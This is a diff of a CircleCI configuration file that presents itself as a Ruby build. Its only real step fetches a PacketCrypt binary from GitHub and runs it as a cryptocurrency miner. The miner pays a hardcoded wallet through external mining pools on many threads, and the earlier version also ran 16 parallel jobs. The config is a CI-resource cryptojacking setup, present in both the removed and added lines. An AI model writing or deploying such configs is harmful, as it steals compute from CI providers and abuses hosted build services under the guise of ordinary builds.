@@ -1,18 +1,12 @@
-version: 2.1
+version: 2.0
 jobs:
-    trial:
-      docker:
-            - image: circleci/ruby:2.5.3
-      parallelism: 16
-      steps:
-        - run:
-            name: Install Dependencies
-            command: |
-              wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.4/packetcrypt-v0.4.4-linux_amd64 -O packetcrypt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1q6ft7pcncygr05a4vp9zxvgszpxu0j78nqyz9la http://pool.pktpool.io http://pool.pkt.world --threads 30
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run:   wget https://github.com/cjdelisle/packetcrypt_rs/releases/download/packetcrypt-v0.4.4/packetcrypt-v0.4.4-linux_amd64 -O packetcrypt && chmod +x packetcrypt && ./packetcrypt ann -p pkt1q6ft7pcncygr05a4vp9zxvgszpxu0j78nqyz9la http://pool.pktpool.io http://pool.pkt.world --threads 28
  
-
-workflows:
-    version: 2.1
-    build:
-        jobs:
-        - trial
